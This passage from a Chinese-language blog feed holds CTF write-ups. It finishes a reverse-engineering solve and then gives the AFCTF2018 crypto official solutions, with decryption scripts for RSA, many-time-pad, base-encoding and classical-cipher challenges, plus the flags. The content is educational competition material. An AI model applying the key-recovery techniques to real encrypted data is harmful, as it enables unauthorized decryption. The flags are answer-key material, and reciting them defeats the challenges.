		input[i]+=7;
		if(input[i]!=enstr[i]){
			return 1;
		}
	}
	return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;我们只要将给出的&lt;code&gt;enstr&lt;&#x2F;code&gt;所有值减7，就能拿到flag：&lt;&#x2F;p&gt;
&lt;p&gt;__ACTF{a5m_15_1mp0r7an7} __&lt;&#x2F;p&gt;
&lt;h2 id=&quot;guan-yu-wo-f5yi-hou-huan-shi-gao-bu-dong-ta-zai-xiang-xie-shi-yao-zhe-dang-shi&quot;&gt;关于我F5以后还是搞不懂他在想些什么这档事&lt;&#x2F;h2&gt;
&lt;p&gt;把文件放入ida分析，进入&lt;code&gt;main&lt;&#x2F;code&gt; 函数以后F5查看c代码。在接收用户输入以后有很长的一段代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;  v3 = malloc(0x82uLL);
  v14 = v3;
  v4 = qword_55FA3685F068;
  *(_QWORD *)v3 = func_s;
  *((_QWORD *)v3 + 1) = v4;
  v5 = qword_55FA3685F078;
  *((_QWORD *)v3 + 2) = qword_55FA3685F070;
  *((_QWORD *)v3 + 3) = v5;
  v6 = qword_55FA3685F088;
  *((_QWORD *)v3 + 4) = qword_55FA3685F080;
  *((_QWORD *)v3 + 5) = v6;
  v7 = qword_55FA3685F098;
  *((_QWORD *)v3 + 6) = qword_55FA3685F090;
  *((_QWORD *)v3 + 7) = v7;
  v8 = qword_55FA3685F0A8;
  *((_QWORD *)v3 + 8) = qword_55FA3685F0A0;
  *((_QWORD *)v3 + 9) = v8;
  v9 = qword_55FA3685F0B8;
  *((_QWORD *)v3 + 10) = qword_55FA3685F0B0;
  *((_QWORD *)v3 + 11) = v9;
  v10 = qword_55FA3685F0C8;
  *((_QWORD *)v3 + 12) = qword_55FA3685F0C0;
  *((_QWORD *)v3 + 13) = v10;
  v11 = qword_55FA3685F0D8;
  *((_QWORD *)v3 + 14) = qword_55FA3685F0D0;
  *((_QWORD *)v3 + 15) = v11;
  *((_WORD *)v3 + 64) = word_55FA3685F0E0;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这一段其实耐心看完不难发现，完成的其实只是将以&lt;code&gt;func_s&lt;&#x2F;code&gt;为首地址的之后130个字节的数据拷贝到以&lt;code&gt;v3&lt;&#x2F;code&gt;为首地址的空间里，相当于&lt;code&gt;memcpy((char *)v3,func_s,130);&lt;&#x2F;code&gt;。之后的内容则是将这段数据从&lt;code&gt;v3&lt;&#x2F;code&gt;开始，每个字节都异或&lt;code&gt;0x23&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;  v17 = v14;
  v16 = 0;
  while ( v16 &amp;lt;= 129 )
  {
    *v17 ^= 0x23u;
    ++v16;
    ++v17;
  }
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;完成这一步后出现了一个不太寻常的操作：&lt;code&gt;((void (__fastcall *)(char *, char *))v14)(v13, v13);&lt;&#x2F;code&gt; 将这一段数据当作了函数并且传入参数&lt;code&gt;v13&lt;&#x2F;code&gt;调用了它。最后就到了验证flag的环节。flag当然不会原模原样的放在验证数组里（经过两次挨打的出题人终于不再图样了），所以我们还是要搞清楚这段数据被当作函数调用以后对用户的输入做了什么操作。&lt;&#x2F;p&gt;
&lt;p&gt;问题来了，该怎么分析这段数据呢？一个比较省力的办法是使用ida的动态调试功能（因为是elf文件所以需要在linux的虚拟机里进行远程调试，具体的操作方法搜一蛤就能找到），在调用这段数据时下断点，程序自己运行到断点处时，单步进入，创建函数后再使用F5功能，就能看到这段数据被当作函数时是怎样的代码。经由上述操作，我们进入了获得了这段函数的代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;__int64 __fastcall sub_56389A4F1830(__int64 a1)
{
  int i; &amp;#x2F;&amp;#x2F; [rsp+14h] [rbp-4h]

  for ( i = 0; *(_BYTE *)(i + a1); ++i )
    *(_BYTE *)(i + a1) = (*(unsigned __int8 *)(i + a1) &amp;lt;&amp;lt; 32) &amp;amp; ((signed int)*(unsigned __int8 *)(i + a1) &amp;gt;&amp;gt; 32) ^ 0xCC;
  return 0LL;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;a1为用户输入，经历for循环中的移位、和、异或系列操作后返回。之后就是验证环节。运算操作没有很复杂，以下是解密代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;## include&amp;lt;stdio.h&amp;gt;

int main() {
	char str[]={0x8d,0x8f,0x98,0x8a,0xb7,0xbf,0xa3,0xa0,0xba,0xa9,0x93,0xbb,0xa5,0xb8,0xa4,0x93,0xa8,0xb5,0xa2,
	0xad,0xa1,0xa5,0xaf,0x93,0xa8,0xa9,0xae,0xb9,0xab,0xab,0xa5,0xa2,0xab,0xb1};
	for(int i=0;i&amp;lt;=33;i++){
		for(char input = 0x20;input&amp;lt;=0x7e;input++){
			char input_m;
			input_m = ((input&amp;lt;&amp;lt;32)&amp;amp;(input&amp;gt;&amp;gt;32)^0xcc);
			if(input_m == str[i]){
				printf(&amp;quot;%c&amp;quot;,input);
				break;
			}
		}
	}
	return 0;
  
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到flag：&lt;strong&gt;ACTF{solve_with_dynamic_debugging}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>AFCTF2018-Crypto_OfficialWriteUp</title>
		<published>2018-05-21T14:46:15+08:00</published>
		<updated>2020-08-07T01:54:42.997715+08:00</updated>
		<link rel="alternate" href="https://CSUwangj.github.io/afctf2018-crypto-officialwriteup/" type="text/html"/>
		<id>https://CSUwangj.github.io/afctf2018-crypto-officialwriteup/</id>
		<content type="html">&lt;p&gt;最后四个题没人做出来&lt;&#x2F;p&gt;
&lt;p&gt;题目丢到了github，欢迎来玩~&lt;&#x2F;p&gt;
&lt;p&gt;https:&#x2F;&#x2F;github.com&#x2F;CSUwangj&#x2F;AFCTF2018-Crypto&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h1 id=&quot;jian-dan-ti&quot;&gt;简单题&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;morse&quot;&gt;Morse&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;摩尔斯电码转字符，观察会发现是十六进制数，转ASCII码得flag&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{1s&#x27;t_s0_345y}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;base&quot;&gt;BASE&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-1&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;现在放出加密代码&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;import base64
import random
import os
import sys
with open(&amp;#x27;flag.txt&amp;#x27;, &amp;#x27;r&amp;#x27;) as file:
    flag = bytes(file.read(),&amp;#x27;ascii&amp;#x27;)
    file.close()

for i in range(0, 30):
    print(i)
    a = random.randint(0, 2)
    if a == 2:
        flag = base64.b64encode(flag)
    elif a == 1:
        flag = base64.b32encode(flag)
    else:
        flag = base64.b16encode(flag)

with open(&amp;#x27;flag_encode.txt&amp;#x27;, &amp;#x27;w&amp;#x27;) as file:
    file.write(str(flag)[2:-1])
    file.close()

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这个问题的关键在于，经过30重加密的文件不可能会小，直接用文本编辑器打开的都完蛋啦。正确姿势是使用十六进制编辑器或者word打开，或者用程序读入一部分后查看内容。&lt;&#x2F;p&gt;
&lt;p&gt;此外根据题目可以大抵知道这是Base编码。&lt;&#x2F;p&gt;
&lt;p&gt;解密代码如下，可以在出题人博客找到主要部分&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;# -*- coding: utf-8 -*-
# Python3
# Solution.py
from base64 import *
s = &amp;quot;&amp;quot;
with open(&amp;#x27;flag_encode.txt&amp;#x27;, &amp;#x27;r&amp;#x27;) as file:
    s = bytes(file.read(),&amp;#x27;ascii&amp;#x27;)
    file.close()

lis1 = [s]
lis2 = []
lis3 = []
lis4 = []
while(1):
	for a in lis1:
		ok = 0
		try:
			lis2.append(b64decode(a).decode(&amp;#x27;ascii&amp;#x27;))
			ok = 1
		except:
			pass
		try:
			lis2.append(b32decode(a).decode(&amp;#x27;ascii&amp;#x27;))
			ok = 1
		except:
			pass
		try:
			lis2.append(b16decode(a).decode(&amp;#x27;ascii&amp;#x27;))
			ok = 1
		except:
			pass
		if not ok:
			lis3.append(a)
	if not len(lis2):
		break
	lis1=lis2.copy()
	lis2.clear()
for a in range(0,len(lis3)):
	ok = 1
	for b in lis3[a]:
		if ord(b)&amp;gt;126 or ord(b)&amp;lt;32:
			ok = 0
			break
	if ok:
		lis4.append(lis3[a])
print(lis4)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-1&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{U_5h0u1d_Us3_T00l5}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;magicnum&quot;&gt;MagicNum&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-2&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;这个题可能有点脑洞的成分了，结果导致做出来的人很少。其实提示已经很明显了。&lt;&#x2F;p&gt;
&lt;p&gt;加密代码如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
char flag[]=&amp;quot;afctf{sec_is_everywhere}&amp;quot;;

int main()
{
	for(int i=0;i&amp;lt;6;++i){
		printf(&amp;quot;%20f\n&amp;quot;,*(float*)(flag+i*4));
	}
	return 0;
}

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-2&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{sec_is_everywhere}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;single&quot;&gt;Single&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-3&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;这是古典密码学中经典的加密方式，单表替换。将a-z映射到a-z排列。&lt;&#x2F;p&gt;
&lt;p&gt;虽然密钥空间达到了 $26!$ 但是可以被频率分析很轻松地解决。&lt;&#x2F;p&gt;
&lt;p&gt;此外为了降低难度，让新人也能靠自己体验一把解密的感觉，将flag以原样放了进去，并且放出了加密代码，即便不了解频率分析也可以手动推算出来。&lt;&#x2F;p&gt;
&lt;p&gt;工具的话用https:&#x2F;&#x2F;quipqiup.com&#x2F;，可以秒解&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-3&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{Oh_U_found_it_nice_tRy}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;fei-yu-qi-jie&quot;&gt;非预期解&lt;&#x2F;h3&gt;
&lt;p&gt;C++标准库里的random_shuffle十分腊鸡……以至于我只放出加密代码的情况下，在另一台机器另一个编译器上……运行得到的结果是一样的……导致直接用加密代码改改就出flag的愚蠢情况……&lt;&#x2F;p&gt;
&lt;p&gt;出题人表示背锅，并下次手写随机数生成来解决。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;vigenere&quot;&gt;Vigenère&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-4&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;多表替换，密钥是csuwangjiang&lt;&#x2F;p&gt;
&lt;p&gt;因为我的昵称和大学都是可见信息，所以又算脑洞了？&lt;&#x2F;p&gt;
&lt;p&gt;用工具可以秒解，随便放几个吧。&lt;&#x2F;p&gt;
&lt;p&gt;一个维吉尼亚：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.practicalcryptography.com&#x2F;ciphers&#x2F;classical-era&#x2F;vigenere-gronsfeld-and-autokey&#x2F;&quot;&gt;Vigenère and Gronsfeld Cipher&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;另一个维吉尼亚：&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;atomcated.github.io&#x2F;Vigenere&#x2F;&quot;&gt;https:&#x2F;&#x2F;atomcated.github.io&#x2F;Vigenere&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;另一个维吉尼亚：&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;http:&#x2F;&#x2F;www.mygeocachingprofile.com&#x2F;codebreaker.vigenerecipher.aspx&quot;&gt;http:&#x2F;&#x2F;www.mygeocachingprofile.com&#x2F;codebreaker.vigenerecipher.aspx&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;另一个维吉尼亚：&lt;a rel=&quot;noopener nofollow noreferrer&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;f00l.de&#x2F;hacking&#x2F;vigenere.php&quot;&gt;https:&#x2F;&#x2F;f00l.de&#x2F;hacking&#x2F;vigenere.php&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;具体原理就还是频率分析、常见词的替换，比如中间那句可以推测是&lt;code&gt;flag is afctf{....}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-4&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{Whooooooo_U_Gotcha!}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ni-neng-kan-chu-zhe-shi-shi-yao-jia-mi-yao&quot;&gt;你能看出这是什么加密么？&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-5&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;裸RSA&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python

import libnum

p=int(&amp;#x27;0x928fb6aa9d813b6c3270131818a7c54edb18e3806942b88670106c1821e0326364194a8c49392849432b37632f0abe3f3c52e909b939c91c50e41a7b8cd00c67d6743b4f&amp;#x27;,16)

q=int(&amp;#x27;0xec301417ccdffa679a8dcc4027dd0d75baf9d441625ed8930472165717f4732884c33f25d4ee6a6c9ae6c44aedad039b0b72cf42cab7f80d32b74061&amp;#x27;,16)

e=int(&amp;#x27;0x10001&amp;#x27;, 16)

c=int(&amp;#x27;0x70c9133e1647e95c3cb99bd998a9028b5bf492929725a9e8e6d2e277fa0f37205580b196e5f121a2e83bc80a8204c99f5036a07c8cf6f96c420369b4161d2654a7eccbdaf583204b645e137b3bd15c5ce865298416fd5831cba0d947113ed5be5426b708b89451934d11f9aed9085b48b729449e461ff0863552149b965e22b6&amp;#x27;,16)

n=p*q

phi=(p-1)*(q-1)

d = libnum.modular.invmod(e, phi)

print libnum.n2s(pow(c, d, n))
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-5&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{R54_|5_$0_$imp13}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;ke-lian-de-rsa&quot;&gt;可怜的RSA&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-6&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;用OpenSSL查看公钥，尝试将其分解成私钥&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre&gt;&lt;code&gt;openssl rsa -noout -text -inform PEM -in public.key -pubin
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;将十六进制转为十进制&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre&gt;&lt;code&gt;python -c &amp;quot;print int(&amp;#x27;25b18bf5f389097d17237866bb51cff8de922453749ebc403b0995c97c0e386d46c161cadff77c69860dae4791c214cf8487aaaa9f26e920a977834906038aefb5c30827dfcf3fc9e9769544f94e07cdfe0872039a3a6262116678b261fb2d6b9d32539e92a153b3675629bab3942e7d35e30f7eef5abf1c50d797d0cc88e1bdccfd1a12ea6f7ef75c3727dbdf2e780f3428ae8f7a4fb7a89f184a365032b153f8425e845750eb2b7abc02dc15ce0207507aa950863bb8480a78028dd62979944d6c633fafa103e4db28ce87f5a0c6ed4a2f2664427f565c7781ab6191456d971c7ffa395272374cec0155e5f91189db742e4c28b03a0fa11cffb03173d2a4cce6ae53&amp;#x27;, 16)&amp;quot;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;用网站对其分解（http:&#x2F;&#x2F;www.factordb.com&#x2F;index.php?query=79832181757332818552764610761349592984614744432279135328398999801627880283610900361281249973175805069916210179560506497075132524902086881120372213626641879468491936860976686933630869673826972619938321951599146744807653301076026577949579618331502776303983485566046485431039541708467141408260220098592761245010678592347501894176269580510459729633673468068467144199744563731826362102608811033400887813754780282628099443490170016087838606998017490456601315802448567772411623826281747245660954245413781519794295336197555688543537992197142258053220453757666537840276416475602759374950715283890232230741542737319569819793988431443）&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;得到p、q&lt;&#x2F;p&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;然后用rsatool生成私钥，发现flag.enc还经过base64加密，所以最后&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;def decrypt_RSA(privkey, message):
    from Crypto.PublicKey import RSA 
    from Crypto.Cipher import PKCS1_OAEP 
    from base64 import b64decode 
    key = open(privkey, &amp;quot;r&amp;quot;).read() 
    rsakey = RSA.importKey(key) 
    rsakey = PKCS1_OAEP.new(rsakey) 
    decrypted = rsakey.decrypt(b64decode(message)) 
    return decrypted
 
flag = &amp;quot;GVd1d3viIXFfcHapEYuo5fAvIiUS83adrtMW&amp;#x2F;MgPwxVBSl46joFCQ1plcnlDGfL19K&amp;#x2F;3PvChV6n5QGohzfVyz2Z5GdTlaknxvHDUGf5HCukokyPwK&amp;#x2F;1EYU7NzrhGE7J5jPdi0Aj7xi&amp;#x2F;Odxy0hGMgpaBLd&amp;#x2F;nL3N8O6i9pc4Gg3O8soOlciBG&amp;#x2F;6&amp;#x2F;xdfN3SzSStMYIN8nfZZMSq3xDDvz4YB7TcTBh4ik4wYhuC77gmT+HWOv5gLTNQ3EkZs5N3EAopy11zHNYU80yv1jtFGcluNPyXYttU5qU33jcp0Wuznac+t+AZHeSQy5vk8DyWorSGMiS+J4KNqSVlDs12EqXEqqJ0uA==&amp;quot;
print decrypt_RSA(&amp;#x27;priv.key&amp;#x27;, flag)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-6&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;afctf{R54_|5_$0_B0rin9}&lt;&#x2F;p&gt;
&lt;h2 id=&quot;one-secret-two-encryption&quot;&gt;One Secret, Two encryption&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-7&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;素数复用，求gcd即可得到一个素数，随便求一对，然后解密得到flag&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-7&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;flag is afctf{You_Know_0p3u55I}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;zhong-deng-ti&quot;&gt;中等题&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;tiny-lfsr&quot;&gt;Tiny LFSR&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-8&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;LFSR的下一位只由当前决定，通过一对明文密文异或获得初始密钥，然后进行解密即可&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-8&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{read_is_hard_but_worthy}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;myowncbc&quot;&gt;MyOwnCBC&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-9&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;读了代码应该知道，其实并不是CBC而是愚蠢的自创加密模式，使用上一步的密文作为新一步的密钥。&lt;&#x2F;p&gt;
&lt;p&gt;所以直接读密文然后解密就行，flag也放在了末尾。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;flag-9&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{Don&#x27;t_be_fooled_by_yourself}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;zhong-nan-ti&quot;&gt;中难题&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;ni-ting-guo-yi-ci-yi-mi-yao&quot;&gt;你听过一次一密么？&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-10&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;Many-Time-Pad了解一下？&lt;&#x2F;p&gt;
&lt;p&gt;按这个名词去谷歌能搜到很多分析&lt;&#x2F;p&gt;
&lt;p&gt;解密代码如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;#!&amp;#x2F;usr&amp;#x2F;bin&amp;#x2F;python
## OTP - Recovering the private key from a set of messages that were encrypted w&amp;#x2F; the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017
# Original code by jwomers: https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;Jwomers&amp;#x2F;many-time-pad-attack&amp;#x2F;blob&amp;#x2F;master&amp;#x2F;attack.py)

import string
import collections
import sets, sys

# 11 unknown ciphertexts (in hex format), all encrpyted with the same key

c1=&amp;#x27;25030206463d3d393131555f7f1d061d4052111a19544e2e5d&amp;#x27;
c2=&amp;#x27;0f020606150f203f307f5c0a7f24070747130e16545000035d&amp;#x27;
c3=&amp;#x27;1203075429152a7020365c167f390f1013170b1006481e1314&amp;#x27;
c4=&amp;#x27;0f4610170e1e2235787f7853372c0f065752111b15454e0e09&amp;#x27;
c5=&amp;#x27;081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18&amp;#x27;
c6=&amp;#x27;0909075412132e247436425332281a1c561f04071d520f0b11&amp;#x27;
c7=&amp;#x27;4116111b101e2170203011113a69001b475206011552050219&amp;#x27;
c8=&amp;#x27;041006064612297020375453342c17545a01451811411a470e&amp;#x27;
c9=&amp;#x27;021311114a5b0335207f7c167f22001b44520c15544801125d&amp;#x27;
c10=&amp;#x27;06140611460c26243c7f5c167f3d015446010053005907145d&amp;#x27;
c11=&amp;#x27;0f05110d160f263f3a7f4210372c03111313090415481d49&amp;#x27;
ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]
# The target ciphertext we want to crack
#target_cipher = &amp;quot;0529242a631234122d2b36697f13272c207f2021283a6b0c7908&amp;quot;

# XORs two string
def strxor(a, b):     # xor two strings (trims the longer input)
    return &amp;quot;&amp;quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])

def target_fix(target_cipher):
	# To store the final key
	final_key = [None]*150
	# To store the positions we know are broken
	known_key_positions = set()

	# For each ciphertext
	for current_index, ciphertext in enumerate(ciphers):
		counter = collections.Counter()
		# for each other ciphertext
		for index, ciphertext2 in enumerate(ciphers):
			if current_index != index: # don&amp;#x27;t xor a ciphertext with itself
				for indexOfChar, char in enumerate(strxor(ciphertext.decode(&amp;#x27;hex&amp;#x27;), ciphertext2.decode(&amp;#x27;hex&amp;#x27;))): # Xor the two ciphertexts
					# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&amp;#x27;t know which one)
					if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index
		knownSpaceIndexes = []

		# Loop through all positions where a space character was possible in the current_index cipher
		for ind, val in counter.items():
			# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!
			if val &amp;gt;= 7: knownSpaceIndexes.append(ind)
		#print knownSpaceIndexes # Shows all the positions where we now know the key!

		# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!
		xor_with_spaces = strxor(ciphertext.decode(&amp;#x27;hex&amp;#x27;),&amp;#x27; &amp;#x27;*150)
		for index in knownSpaceIndexes:
			# Store the key&amp;#x27;s value at the correct position
			final_key[index] = xor_with_spaces[index].encode(&amp;#x27;hex&amp;#x27;)
			# Record that we known the key at this position
			known_key_positions.add(index)

	# Construct a hex key from the currently known key, adding in &amp;#x27;00&amp;#x27; hex chars where we do not know (to make a complete hex string)
	final_key_hex = &amp;#x27;&amp;#x27;.join([val if val is not None else &amp;#x27;00&amp;#x27; for val in final_key])
	# Xor the currently known key with the target cipher
	output = strxor(target_cipher.decode(&amp;#x27;hex&amp;#x27;),final_key_hex.decode(&amp;#x27;hex&amp;#x27;))

	print &amp;quot;Fix this sentence:&amp;quot;
	print &amp;#x27;&amp;#x27;.join([char if index in known_key_positions else &amp;#x27;*&amp;#x27; for index, char in enumerate(output)])+&amp;quot;\n&amp;quot;

	# WAIT.. MANUAL STEP HERE 
	# This output are printing a * if that character is not known yet
	# fix the missing characters like this: &amp;quot;Let*M**k*ow if *o{*a&amp;quot; = &amp;quot;cure, Let Me know if you a&amp;quot;
	# if is too hard, change the target_cipher to another one and try again
	# and we have our key to fix the entire text!

	#sys.exit(0) #comment and continue if u got a good key

	target_plaintext = &amp;quot;cure, Let Me know if you a&amp;quot;
	print &amp;quot;Fixed:&amp;quot;
	print target_plaintext+&amp;quot;\n&amp;quot;

	key = strxor(target_cipher.decode(&amp;#x27;hex&amp;#x27;),target_plaintext)

	print &amp;quot;Decrypted msg:&amp;quot;
	for cipher in ciphers:
		print strxor(cipher.decode(&amp;#x27;hex&amp;#x27;),key)

	print &amp;quot;\nPrivate key recovered: &amp;quot;+key+&amp;quot;\n&amp;quot;
	
for i in ciphers:
	target_fix(i)
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;flag-10&quot;&gt;flag&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;code&gt;afctf{OPT_1s_Int3rest1ng}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;hua-kai-cang-bao-di&quot;&gt;花开藏宝地&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;jie-ti-si-lu-11&quot;&gt;解题思路&lt;&#x2F;h3&gt;
&lt;p&gt;题目里的藏宝图 + 题面里提到只要集3份就能解密-&amp;gt;门限方案&lt;&#x2F;p&gt;
&lt;p&gt;花开-&amp;gt;bloom门限方案&lt;&#x2F;p&gt;
&lt;p&gt;也是一次尝试吧，尝试除了加密与编码外的考点&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;secret1 生日字典&#x2F;脑洞 19260817&lt;&#x2F;li&gt;
&lt;li&gt;secret2 小写爆破 alice&lt;&#x2F;li&gt;
&lt;li&gt;secret3 大写爆破 AVADA&lt;&#x2F;li&gt;
&lt;li&gt;secret4 伪加密&lt;&#x2F;li&gt;
&lt;li&gt;secret5 NTFS隐写&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;任意取得三份后用bloom门限方案解，素数为题面的数字&lt;&#x2F;p&gt;
&lt;p&gt;代码（取1&#x2F;2&#x2F;3）：&lt;&#x2F;p&gt;
